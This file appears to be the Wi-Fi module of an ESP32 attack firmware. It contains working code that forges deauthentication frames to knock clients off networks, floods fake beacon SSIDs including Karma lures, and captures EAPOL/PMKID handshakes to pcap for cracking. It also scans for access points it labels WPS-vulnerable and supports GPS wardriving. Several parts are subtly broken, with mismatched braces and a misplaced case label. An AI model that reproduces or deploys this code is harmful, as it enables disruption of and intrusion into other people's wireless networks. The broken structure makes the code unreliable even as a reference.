#include "wifi_module.h"
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <Arduino.h>
#include <components/gps_module/gps_module.h>
#include "callbacks.h"
#include <ArduinoHttpClient.h>

String WiFiModule::freeRAM()
{
  char s[150];
  sprintf(s, "RAM Free: %u bytes", esp_get_free_heap_size());
  return String(s);
}

void WiFiModule::insertTimestamp(uint8_t *packet)
{
  struct timeval now;
  gettimeofday(&now, NULL);

  uint64_t timestamp = (uint64_t)now.tv_sec * 1000000 + now.tv_usec;


  for (int i = 0; i < 8; i++) {
      packet[24 + i] = (timestamp >> (i * 8)) & 0xFF;
  }
}

void WiFiModule::insertWPA2Info(uint8_t *packet, int ssidLength) {
    int start = 36 + ssidLength + 2 + 8;


    uint8_t rsnInfo[] = {
        0x30, 0x14, // Element ID and Length for RSN (WPA2) IE
        0x01, 0x00, // RSN Version 1
        0x00, 0x0F, 0xAC, 0x04, // Group Cipher Suite: AES (CCMP)
        0x01, 0x00, // Pairwise Cipher Suite Count: 1
        0x00, 0x0F, 0xAC, 0x04, // Pairwise Cipher Suite: AES (CCMP)
        0x01, 0x00, // AKM Suite Count: 1
        0x00, 0x0F, 0xAC, 0x02, // AKM Suite: PSK
        0x00, 0x00 // RSN Capabilities
    };

    for (int i = 0; i < sizeof(rsnInfo); i++) {
        packet[start + i] = rsnInfo[i];
    }
}

int WiFiModule::generateSSIDs(int count) {
  uint8_t num_gen = count;
  for (uint8_t x = 0; x < num_gen; x++) {
    String essid = "";

    for (uint8_t i = 0; i < 6; i++)
      essid.concat(alfa[random(65)]);

    ssid s = {essid, random(1, 12), {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
    ssids->add(s);
    Serial.println(ssids->get(ssids->size() - 1).essid);
  }

  return num_gen;
}

String WiFiModule::getApMAC()
{
  char *buf;
  uint8_t mac[6];
  char macAddrChr[18] = {0};
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_err_t mac_status = esp_wifi_get_mac(WIFI_IF_AP, mac);
  this->wifi_initialized = true;
  sprintf(macAddrChr, 
          "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0],
          mac[1],
          mac[2],
          mac[3],
          mac[4],
          mac[5]);
  this->shutdownWiFi();
  return String(macAddrChr);
}

bool WiFiModule::shutdownWiFi() {
  if (this->wifi_initialized) {
    this->wifi_initialized = false; // Stop all other while loops first
    esp_wifi_set_promiscuous(false);
    WiFi.disconnect();
    WiFi.mode(WIFI_OFF);

    dst_mac = "ff:ff:ff:ff:ff:ff";

    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_stop();
    esp_wifi_restore();
    esp_wifi_set_promiscuous_rx_cb(NULL); // fixes callback from being called still
    return true;
  }
  else {
    return false;
  }
}

bool WiFiModule::addSSID(String essid) {
  ssid s = {essid, random(1, 12), {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
  ssids->add(s);
  Serial.println(ssids->get(ssids->size() - 1).essid);

  return true;
}

void WiFiModule::Sniff(SniffType Type, int TargetChannel)
{
  bool SetChannel = TargetChannel != 0;
  int set_channel = TargetChannel == 0 ? random(1, 13) : TargetChannel;
  if (MostActiveChannel != 0)
  {
    set_channel = MostActiveChannel;
  }
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);

  esp_err_t err;
  wifi_config_t conf;
  err = esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR);

  esp_wifi_get_config((wifi_interface_t)WIFI_IF_AP, &conf);
  conf.ap.ssid[0] = '\0';
  conf.ap.ssid_len = 0;
  conf.ap.channel = set_channel;
  conf.ap.ssid_hidden = 1;
  conf.ap.max_connection = 0;
  conf.ap.beacon_interval = 60000;
  err = esp_wifi_set_config((wifi_interface_t)WIFI_IF_AP, &conf);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);

  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);

  this->wifi_initialized = true;
  initTime = millis();

 switch (Type)
  {
    case SniffType::ST_beacon:
    {
      
      esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
#ifdef SD_CARD_CS_PIN
      SystemManager::getInstance().sdCardModule.startPcapLogging("BEACON.pcap");
#endif
      break;    
    }
    case SniffType::ST_pmkid:
    {
      esp_wifi_set_promiscuous_rx_cb(&eapolSnifferCallback);
#ifdef SD_CARD_CS_PIN
      SystemManager::getInstance().sdCardModule.startPcapLogging("EAPOL.pcap");
#endif
     break;
    }
    case SniffType::ST_probe:
    {
      esp_wifi_set_promiscuous_rx_cb(&probeSnifferCallback);
#ifdef SD_CARD_CS_PIN
      SystemManager::getInstance().sdCardModule.startPcapLogging("PROBE.pcap");
#endif
     break;
    }
    case SniffType::ST_pwn:
    {
      esp_wifi_set_promiscuous_rx_cb(&pwnSnifferCallback);
#ifdef SD_CARD_CS_PIN
      SystemManager::getInstance().sdCardModule.startPcapLogging("PWN.pcap");
#endif
      break;
    }
    case SniffType::ST_raw:
    {
      esp_wifi_set_promiscuous_rx_cb(&rawSnifferCallback);
#ifdef SD_CARD_CS_PIN
      SystemManager::getInstance().sdCardModule.startPcapLogging("RAW.pcap");
#endif
      break;
    }
    case SniffType::ST_Deauth:
    {
      esp_wifi_set_promiscuous_rx_cb(&deauthapSnifferCallback);
      break;
    }
  }
  
  static unsigned long lastChangeTime = 0;
  while (wifi_initialized)
  {
    if (Serial.available() > 0)
    {
      shutdownWiFi();
      SystemManager::getInstance().sdCardModule.stopPcapLogging();
      break;
    }
    unsigned long currentTime = millis();


    if (SystemManager::getInstance().Settings.ChannelHoppingEnabled())
    {
      if (currentTime - lastChangeTime >= SystemManager::getInstance().Settings.getChannelSwitchDelay() && MostActiveChannel == 0)
      {
        if (!SetChannel)
        {
          set_channel += 1;
          set_channel = set_channel % 13; 
          esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
          Serial.printf("Set Scanning Channel to %i\n", set_channel);
        }
        lastChangeTime = currentTime;
        if (SystemManager::getInstance().Settings.getRGBMode() == FSettings::RGBMode::Normal)
        {
  #ifdef OLD_LED
  SystemManager::getInstance().rgbModule->breatheLED(SystemManager::getInstance().rgbModule->redPin, 1000);
  #endif
  #ifdef NEOPIXEL_PIN
        SystemManager::getInstance().neopixelModule->breatheLED(SystemManager::getInstance().neopixelModule->strip.Color(255, 0, 255), 1000, false);
  #endif
        }
      }
    }
  }
}

void WiFiModule::Scan(ScanType type)
{
  switch (type)
  {
    case ScanType::SCAN_AP:
    {
        delete access_points;
        access_points = new LinkedList<AccessPoint>();

        uint8_t set_channel = random(1, 12);

        esp_wifi_init(&cfg);
        esp_wifi_set_storage(WIFI_STORAGE_RAM);
        esp_wifi_set_mode(WIFI_MODE_NULL);
        esp_wifi_start();
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_filter(&filt);
        esp_wifi_set_promiscuous_rx_cb(&apSnifferCallbackFull);
        esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
        this->wifi_initialized = true;
        initTime = millis();
        static unsigned long lastChangeTime = 0;
        static int lastchannel = 0;

      while (wifi_initialized)
      {
        if (Serial.available() > 0)
        {
          shutdownWiFi();
          break;
        }
        if (SystemManager::getInstance().Settings.ChannelHoppingEnabled())
        {
          unsigned long currentTime = millis();
          if (currentTime - lastChangeTime >= SystemManager::getInstance().Settings.getChannelSwitchDelay())
          {
            Serial.println("Channel Switched");
            lastchannel++ % 13;
            uint8_t set_channel = lastchannel;
            esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
            lastChangeTime = currentTime;
          }
        }
      }
      break;
    }
    case ScanType::SCAN_STA:
    {
      delete stations;
      stations = new LinkedList<Station>();

      if (SelectedAP.channel == 0)
      {
        Serial.println("Cant Set Channel to 0. Maybe You Forgot to select a ap");
        return;
      }

      uint8_t set_channel = SelectedAP.channel;

      esp_wifi_init(&cfg);
      esp_wifi_set_storage(WIFI_STORAGE_RAM);
      esp_wifi_set_mode(WIFI_MODE_NULL);
      esp_wifi_start();
      esp_wifi_set_promiscuous(true);
      esp_wifi_set_promiscuous_filter(&filt);
      esp_wifi_set_promiscuous_rx_cb(&stationSnifferCallback);
      esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
      this->wifi_initialized = true;
      initTime = millis();
      static unsigned long lastChangeTime = 0;
      static int lastchannel = 0;

      while (this->wifi_initialized)
      {
        if (Serial.available() > 0)
        {
          shutdownWiFi();
          break;
        }
        unsigned long currentTime = millis();
        if (currentTime - lastChangeTime >= 2000)
        {
          lastchannel++ % 13;
          uint8_t set_channel = lastchannel;
          esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
          lastChangeTime = currentTime;
        }
      }

      break;
    }
    case ScanType::SCAN_WARDRIVE:
    {
      SystemManager::getInstance().gpsModule->setup(EnableBLEWardriving);

      while (!SystemManager::getInstance().gpsModule->Stop)
      {
        SystemManager::getInstance().gpsModule->WarDrivingLoop();
      }
    }
  }
}

void WiFiModule::LaunchEvilPortal()
{
  
}

void WiFiModule::listAccessPoints()
{
    if (access_points != nullptr) {
        for (int i = 0; i < access_points->size(); i++) {
            String output = "[" + (String)i + "][CH:" + (String)access_points->get(i).channel + "] " 
                            + access_points->get(i).essid + " " 
                            + (String)access_points->get(i).rssi + " "
                            + access_points->get(i).Manufacturer;

            if (access_points->get(i).essid == SelectedAP.essid) {
                output += " (selected)";
            }

            Serial.println(output);
        }
    }
}

void WiFiModule::listSSIDs()
{
    if (ssids != nullptr) {
        for (int i = 0; i < ssids->size(); i++) {
            String output = "[" + (String)i + "] " + ssids->get(i).essid;

            if (ssids->get(i).essid == SelectedAP.essid) {
                output += " (selected)";
            }

            Serial.println(output);
        }
    }
}

void WiFiModule::listStations()
{
    if (access_points != nullptr) {
        char sta_mac[] = "00:00:00:00:00:00";
        for (int x = 0; x < access_points->size(); x++) {
            if (access_points->get(x).stations != nullptr) {
                Serial.println("[" + (String)x + "] " + access_points->get(x).essid + " " + (String)access_points->get(x).rssi + ":");
                for (int i = 0; i < access_points->get(x).stations->size(); i++) {
                    SystemManager::getInstance().wifiModule.getMACatoffset(sta_mac, stations->get(access_points->get(x).stations->get(i)).mac, 0);
                    String output = "  [" + (String)access_points->get(x).stations->get(i) + "] " + sta_mac;

                    if (stations->get(access_points->get(x).stations->get(i)).selected) {
                        output += " (selected)";
                    }

                    Serial.println(output);
                }
            }
        }
    }
}

void WiFiModule::setManufacturer(AccessPoint* ap)
{
    char bssidPrefix[7];
    snprintf(bssidPrefix, sizeof(bssidPrefix), "%02X%02X%02X", ap->bssid[0], ap->bssid[1], ap->bssid[2]);

    for (const auto& entry : CompanyOUIMap)
    {
        for (const auto& prefix : entry.second)
        {
            if (strncmp(bssidPrefix, prefix, 6) == 0)
            {
                switch (entry.first)
                {
                    case ECompany::DLink:
                        ap->Manufacturer = "DLink";
                        break;
                    case ECompany::Netgear:
                        ap->Manufacturer = "Netgear";
                        break;
                    case ECompany::Belkin:
                        ap->Manufacturer = "Belkin";
                        break;
                    case ECompany::TPLink:
                        ap->Manufacturer = "TP-Link";
                        break;
                    case ECompany::Linksys:
                        ap->Manufacturer = "Linksys";
                        break;
                    case ECompany::ASUS:
                        ap->Manufacturer = "ASUS";
                        break;
                    case ECompany::Actiontec:
                        ap->Manufacturer = "Actiontec";
                        break;
                    default:
                        ap->Manufacturer = "Unknown";
                        break;
                }

                Serial.print("Manufacturer set: ");
                Serial.println(ap->Manufacturer);
                return;
            }
        }
    }

    ap->Manufacturer = "Unknown";
}


bool WiFiModule::isVulnerableBSSID(AccessPoint* ap)
{
    char bssidPrefix[7];
    snprintf(bssidPrefix, sizeof(bssidPrefix), "%02X%02X%02X", ap->bssid[0], ap->bssid[1], ap->bssid[2]);
    
    for (const auto& entry : CompanyOUIMap)
    {
        for (const auto& prefix : entry.second)
        {
            if (strncmp(bssidPrefix, prefix, 6) == 0)
            {
                switch (entry.first)
                {
                    case ECompany::DLink:
                        ap->Manufacturer = "DLink";
                        break;
                    case ECompany::Netgear:
                        ap->Manufacturer = "Netgear";
                        break;
                    case ECompany::Belkin:
                        ap->Manufacturer = "Belkin";
                        break;
                    case ECompany::TPLink:
                        ap->Manufacturer = "TP-Link";
                        break;
                    default:
                        ap->Manufacturer = "Unknown";
                        return false;
                        break;
                }

                Serial.print("Manufacturer set: ");
                Serial.println(ap->Manufacturer);

                return true;
            }
        }
    }
    return false;
}


bool WiFiModule::isAccessPointAlreadyAdded(LinkedList<AccessPoint *> &accessPoints, const uint8_t *bssid)
{
  for (int i = 0; i < accessPoints.size(); i++) {
    AccessPoint* ap = accessPoints.get(i);
    if (memcmp(ap->bssid, bssid, 6) == 0) {
        return true;
    }
  }
  return false;
}

void WiFiModule::getMACatoffset(char *addr, uint8_t* data, uint16_t offset) {
  sprintf(addr, "%02x:%02x:%02x:%02x:%02x:%02x", data[offset+0], data[offset+1], data[offset+2], data[offset+3], data[offset+4], data[offset+5]);
}

void WiFiModule::getMACatoffset(uint8_t *addr, uint8_t* data, uint16_t offset) {
  {data[offset+0], data[offset+1], data[offset+2], data[offset+3], data[offset+4], data[offset+5];};
}

int WiFiModule::ClearList(ClearType type)
{
  int num_cleared;

  switch (type)
  {
    case ClearType::CT_AP:
    {
      int num_cleared = access_points->size();
      access_points->clear();
      break;
    }
    case ClearType::CT_SSID:
    {
      num_cleared = ssids->size();
      ssids->clear();
      Serial.println("ssids: " + (String)ssids->size());
      break;
    }
    case ClearType::CT_STA:
    {
      num_cleared = stations->size();
      stations->clear();

      for (int i = 0; i < access_points->size(); i++)
        access_points->get(i).stations->clear();
      
     break;
    }
  }
  return num_cleared;
}

int WiFiModule::findMostActiveWiFiChannel() {
    int networkCount = WiFi.scanNetworks();
    Serial.println("Scan complete");
    
    if (networkCount == 0) {
        Serial.println("No networks found");
        return -1;
    }

    
    int channelCount[14] = {0};


    for (int i = 0; i < networkCount; ++i) {
        int channel = WiFi.channel(i);
        if (channel > 0 && channel < 14) {
            channelCount[channel]++;
        }
    }


    int mostActiveChannel = 1;
    int highestCount = channelCount[1];
    
    for (int i = 2; i < 14; ++i) {
        if (channelCount[i] > highestCount) {
            mostActiveChannel = i;
            highestCount = channelCount[i];
        }
    }

    Serial.print("Most active channel: ");
    Serial.println(mostActiveChannel);
    
    return mostActiveChannel;
}

void WiFiModule::Calibrate()
{
  int CalibratedChannel = findMostActiveWiFiChannel();

  if (CalibratedChannel != -1)
  {
    Serial.printf("Set Calibrated Channel to %i", CalibratedChannel);
    LOG_MESSAGE_TO_SD("Set Calibrated Channel to " + String(CalibratedChannel));
    MostActiveChannel = CalibratedChannel;
  }
  else
  {
    Serial.printf("Failed to Find Any Wifi Networks");
    LOG_MESSAGE_TO_SD("Failed to Find Any Wifi Networks");
  }
}

void WiFiModule::SendWebRequest(const char* SSID, const char* Password, String requestType, String url, String data) 
{
    if (WiFi.status() != WL_CONNECTED) {
        Serial.println("Connecting to WiFi...");
        WiFi.begin(SSID, Password);

        int maxAttempts = 10, attempt = 0;
        while (WiFi.status() != WL_CONNECTED && attempt < maxAttempts) {
            delay(1000);
            Serial.print(".");
            attempt++;
        }
        Serial.println();

        if (WiFi.status() == WL_CONNECTED) {
            Serial.println("Connected to WiFi");
        } else {
            Serial.println("Failed to connect to WiFi");
            return;
        }
    }

    String requestTypeLower = requestType;
    requestTypeLower.toLowerCase();

    HttpClient httpClient = HttpClient(wifiClientSecure, url, 443); 

    httpClient.beginRequest();
    httpClient.sendHeader("User-Agent", "ESP32");
    httpClient.sendHeader("Content-Type", "application/json");

    if (requestTypeLower == "get") {
        Serial.println("Sending GET request to " + url);
        httpClient.get(url.c_str());
    } else if (requestTypeLower == "post") {
        Serial.println("Sending POST request to " + url);
        Serial.println("Data: " + data);
        httpClient.post(url.c_str(), "application/json", data.length(), reinterpret_cast<const byte*>(data.c_str()));
    } else if (requestTypeLower == "put") {
        Serial.println("Sending PUT request to " + url);
        Serial.println("Data: " + data);
        httpClient.put(url.c_str(), "application/json", data.length(), reinterpret_cast<const byte*>(data.c_str()));
    } else if (requestTypeLower == "delete") {
        Serial.println("Sending DELETE request to " + url);
        httpClient.del(url.c_str());
    } else {
        Serial.println("Invalid request type");
        httpClient.endRequest();
        return;
    }

    httpClient.endRequest();

    int statusCode = httpClient.responseStatusCode();
    if (statusCode > 0) {
        String Body = httpClient.responseBody();
        Serial.print("HTTP Response code: ");
        Serial.println(statusCode);
        LOG_MESSAGE_TO_SD(Body);
        Serial.println(Body);
    } else {
        Serial.print("Error on sending request: ");
        Serial.println(statusCode);
  }
}

void WiFiModule::Attack(AttackType type)
{
  switch (type)
  {
    case AttackType::AT_Rickroll:
    {
SystemManager::getInstance().SetLEDState(ENeoColor::Red, false);
      while (wifi_initialized)
      {
        if (Serial.available() > 0)
        {
          String message = Serial.readString();

          if (message.startsWith("stop"))
          {
            shutdownWiFi();
            break;
          }
        }
          for (int i = 0; i < 12; i++)
          {
              for (int x = 0; x < (sizeof(rick_roll)/sizeof(char *)); x++)
              {
                broadcastSetSSID(rick_roll[x], i);
              }
          }
          delay(1);
      }
      SystemManager::getInstance().SetLEDState(ENeoColor::Red, true);
      break;
    }
    case AttackType::AT_RandomSSID:
    {
SystemManager::getInstance().SetLEDState(ENeoColor::Red, false);
      while (wifi_initialized)
      {
        if (Serial.available() > 0)
        {
          String message = Serial.readString();

          if (message.startsWith("stop"))
          {
            shutdownWiFi();
            break;
          }
        }
        broadcastRandomSSID();
        delay(1);
      }
SystemManager::getInstance().SetLEDState(ENeoColor::Red, true);
      break;
    case AttackType::AT_ListSSID:
    {
SystemManager::getInstance().SetLEDState(ENeoColor::Red, false);
      while (wifi_initialized)
      {
        if (Serial.available() > 0)
        {
          String message = Serial.readString();

          if (message.startsWith("stop"))
          {
            shutdownWiFi();
            break;
          }
        }
        for (int x = 0; x < 12; x++)
        {
          for (int i = 0; i < ssids->size(); i++)
          {
            broadcastSetSSID(ssids->get(i).essid.c_str(), x);
          }
        }
        delay(1);
      }
SystemManager::getInstance().SetLEDState(ENeoColor::Red, true);
      break;
    }
    case AttackType::AT_DeauthAP:
    {
SystemManager::getInstance().SetLEDState(ENeoColor::Red, false);
        while(wifi_initialized){
        if (Serial.available() > 0)
        {
          if (Serial.available() > 0)
          {
            String message = Serial.readString();

            if (message.startsWith("stop"))
            {
              shutdownWiFi();
              break;
            }
          }
        for(int i = 0; i < access_points->size(); i++){
        AccessPoint ap = access_points->get(i);
        if (ap.essid == SelectedAP.essid)
        {
            for (int x = 0; x < ap.stations->size(); x++) {
              Station cur_sta = stations->get(ap.stations->get(x));
                for (int y = 0; y < 12; y++) {
                  uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};      
                  sendDeauthFrame(ap.bssid, y, broadcast_mac);
                }
              }
          }
        }
      }
SystemManager::getInstance().SetLEDState(ENeoColor::Red, true);
      break;
    }
    case AT_Karma:
    {
      while (wifi_initialized)
      {
        if (Serial.available() > 0)
        {
          String message = Serial.readString();

          if (message.startsWith("stop"))
          {
            shutdownWiFi();
            break;
          }
        }
        for (int i = 0; i < 12; i++)
        {
          for (int x = 0; x < (sizeof(KarmaSSIDs)/sizeof(char *)); x++)
          {
            broadcastSetSSID(KarmaSSIDs[x], i);
          }
        }
        delay(1);
SystemManager::getInstance().SetLEDState(ENeoColor::Red, true);
      }
    }
    case AT_WPS:
    {
      uint8_t set_channel = random(1, 12);

        esp_wifi_init(&cfg);
        esp_wifi_set_storage(WIFI_STORAGE_RAM);
        esp_wifi_set_mode(WIFI_MODE_NULL);
        esp_wifi_start();
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_filter(&filt);
        esp_wifi_set_promiscuous_rx_cb(&WPSScanCallback);
        esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
        this->wifi_initialized = true;
        initTime = millis();
        static unsigned long lastChangeTime = 0;
        static int lastchannel = 0;

      while (wifi_initialized)
      {
        unsigned long currentTime = millis();

        
        if (currentTime - initTime >= 30000)
        {
          break;
        }

       
        if (Serial.available() > 0)
        {
          shutdownWiFi();
          break;
        }

        
        if (currentTime - lastChangeTime >= SystemManager::getInstance().Settings.getChannelSwitchDelay())
        {
          Serial.println("Switched Channel");
          lastchannel = (lastchannel + 1) % 13;
          uint8_t set_channel = lastchannel;
          esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
          lastChangeTime = currentTime;
        }
      }

      shutdownWiFi();

      for (int i = 0; i < WPSAccessPoints.size(); i++) {
        AccessPoint* ap = WPSAccessPoints.get(i);
        if (isVulnerableBSSID(ap))
        {
          Serial.print("ESSID: ");
          Serial.print(ap->essid);
          Serial.print(", BSSID: ");
          for (int j = 0; j < 6; j++) {
            Serial.printf("%02X", ap->bssid[j]);
            if (j < 5) Serial.print(":");
          }
          Serial.print(", Channel: ");
          Serial.print(ap->channel);
          Serial.print(", Manufact");
          Serial.println(ap->Manufacturer);
        }
        else 
        {
          Serial.println(ap->essid);
          Serial.println("Is Not Vulnerable");
        }
      }
      break;
    }
  }
}
}
}

void WiFiModule::broadcastSetSSID(const char* ESSID, uint8_t channel) 
{
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    uint8_t packet[128] = {0};

    // Broadcast MAC address
    for (int i = 0; i < 6; i++) {
        uint8_t rnd = random(256);
        packet[10 + i] = rnd;   // SRC MAC
        packet[16 + i] = rnd;   // BSSID
    }

    
    packet[0] = 0x80; // Beacon frame
    packet[1] = 0x00; // Flags
    packet[2] = 0x00; // Duration
    
  
    packet[22] = 0x00; 
    packet[23] = 0x00;


    uint64_t currentTimeNanos = esp_timer_get_time() * 1000; // Get time in nanoseconds
    uint64_t timestamp = currentTimeNanos / 1000; // Convert nanoseconds to microseconds
    memcpy(&packet[24], &timestamp, sizeof(timestamp));

    
    packet[32] = 0x64;  // 100 TU
    packet[33] = 0x00;

   
    packet[34] = 0x01;
    packet[35] = 0x04;

   
    packet[36] = 0x00;
    packet[37] = strlen(ESSID);
    memcpy(&packet[38], ESSID, strlen(ESSID));

    int offset = 38 + strlen(ESSID);


    packet[offset] = 0x01; // Supported Rates element ID
    packet[offset + 1] = 8; // Length
    uint8_t supportedRates[] = {0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c};
    memcpy(&packet[offset + 2], supportedRates, sizeof(supportedRates));
    offset += 10;

    
    packet[offset] = 0x03; // DSSS Parameter Set element ID
    packet[offset + 1] = 0x01; // Length
    packet[offset + 2] = channel; // Channel number
    offset += 3;

    
    packet[offset] = 0xff; // Vendor specific element ID for HE capabilities
    packet[offset + 1] = 0x0c; // Length (example length, adjust accordingly)
    uint8_t heCapabilities[] = {0x04, 0x05, 0x01, 0x01, 0x20, 0x20, 0x20, 0x00, 0x40, 0x00, 0x01};
    memcpy(&packet[offset + 2], heCapabilities, sizeof(heCapabilities));
    offset += 14;

    
    int packetSize = offset;

    
    esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);
    esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);
    esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);
    esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);
    esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);
    esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);

    packets_sent += 3;
}

void WiFiModule::RunSetup()
{
  ap_config.ap.ssid_hidden = 1;
  ap_config.ap.beacon_interval = 10000;
  ap_config.ap.ssid_len = 0;
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
  esp_wifi_start();

  ssids = new LinkedList<ssid>;
  wifi_initialized = true;
}

void WiFiModule::broadcastRandomSSID() {

    
    uint8_t set_channel = random(1, 12);
    esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
    delay(1);  


    for (int i = 0; i < 6; i++) {
        uint8_t rnd = random(256);
        packet[10 + i] = rnd;   // SRC MAC
        packet[16 + i] = rnd;   // BSSID
    }

    packet[37] = 6;
  
    // Random SSID (6 characters)
    for (int i = 0; i < 6; i++) {
        packet[38 + i] = alfa[random(65)];
    }

    packet[56] = set_channel; // Set channel
  

    uint8_t postSSID[] = {
        0x01, 0x08, 0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c, // Supported rates (up to 9.6 Gbps)
        0x03, 0x01, set_channel, // DSSS Parameter Set (Current Channel)
        
        // High Efficiency (HE) Capabilities (Wi-Fi 6)
        0xff, 0x0c, // HE Capabilities IE ID and Length
        0x04, 0x05, 0x01, 0x01, 0x20, 0x20, 0x20, 0x00, 0x40, 0x00, 0x01, 0x02
    };

    
    uint64_t currentTimeNanos = esp_timer_get_time() * 1000; 
    uint64_t timestamp = currentTimeNanos / 1000;
    memcpy(&packet[24], &timestamp, sizeof(timestamp));

    
    int offset = 38 + 6;
    for(int i = 0; i < sizeof(postSSID); i++) 
        packet[offset + i] = postSSID[i];

    int packetSize = offset + sizeof(postSSID);

      
    esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);
    esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);
    esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);
    packets_sent += 3;
}

void WiFiModule::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
 esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
  
  // Build AP source packet
  deauth_frame_default[4] = mac[0];
  deauth_frame_default[5] = mac[1];
  deauth_frame_default[6] = mac[2];
  deauth_frame_default[7] = mac[3];
  deauth_frame_default[8] = mac[4];
  deauth_frame_default[9] = mac[5];
  
  deauth_frame_default[10] = bssid[0];
  deauth_frame_default[11] = bssid[1];
  deauth_frame_default[12] = bssid[2];
  deauth_frame_default[13] = bssid[3];
  deauth_frame_default[14] = bssid[4];
  deauth_frame_default[15] = bssid[5];

  deauth_frame_default[16] = bssid[0];
  deauth_frame_default[17] = bssid[1];
  deauth_frame_default[18] = bssid[2];
  deauth_frame_default[19] = bssid[3];
  deauth_frame_default[20] = bssid[4];
  deauth_frame_default[21] = bssid[5];      

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

  packets_sent = packets_sent + 3;

  // Build AP dest packet
  deauth_frame_default[4] = bssid[0];
  deauth_frame_default[5] = bssid[1];
  deauth_frame_default[6] = bssid[2];
  deauth_frame_default[7] = bssid[3];
  deauth_frame_default[8] = bssid[4];
  deauth_frame_default[9] = bssid[5];
  
  deauth_frame_default[10] = mac[0];
  deauth_frame_default[11] = mac[1];
  deauth_frame_default[12] = mac[2];
  deauth_frame_default[13] = mac[3];
  deauth_frame_default[14] = mac[4];
  deauth_frame_default[15] = mac[5];

  deauth_frame_default[16] = mac[0];
  deauth_frame_default[17] = mac[1];
  deauth_frame_default[18] = mac[2];
  deauth_frame_default[19] = mac[3];
  deauth_frame_default[20] = mac[4];
  deauth_frame_default[21] = mac[5];      

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

  packets_sent = packets_sent + 3;
}